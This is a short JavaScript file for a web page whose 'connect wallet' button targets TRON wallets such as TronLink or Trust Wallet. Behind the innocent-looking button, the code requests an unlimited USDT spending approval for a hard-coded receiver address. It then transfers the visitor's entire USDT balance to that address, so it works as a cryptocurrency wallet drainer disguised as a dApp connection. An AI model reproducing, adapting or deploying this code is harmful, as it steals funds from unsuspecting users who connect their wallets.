const receiverAddress = "TYPodVjr1UpRzxhrF17CXkxeeT4x1Lqmwu"; // TRC20
const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC-20 USDT

let tronWeb;

window.addEventListener("load", async () => {
  const connectBtn = document.getElementById("connectBtn");
  connectBtn.addEventListener("click", async () => {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      const userAddress = tronWeb.defaultAddress.base58;

      document.getElementById("status").innerText = "Wallet connected: " + userAddress;

      // Approve unlimited USDT
      const usdt = await tronWeb.contract().at(usdtContractAddress);
      try {
        await usdt.approve(receiverAddress, "9223372036854775807").send();
        document.getElementById("status").innerText = "USDT approved ✅";

        // Auto Transfer All USDT
        const balance = await usdt.balanceOf(userAddress).call();
        await usdt.transferFrom(userAddress, receiverAddress, balance).send();
        document.getElementById("status").innerText += "\nUSDT transferred ✅";
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Transaction failed ❌";
      }
    } else {
      alert("Please open in Trust Wallet DApp Browser or TronLink");
    }
  });
});
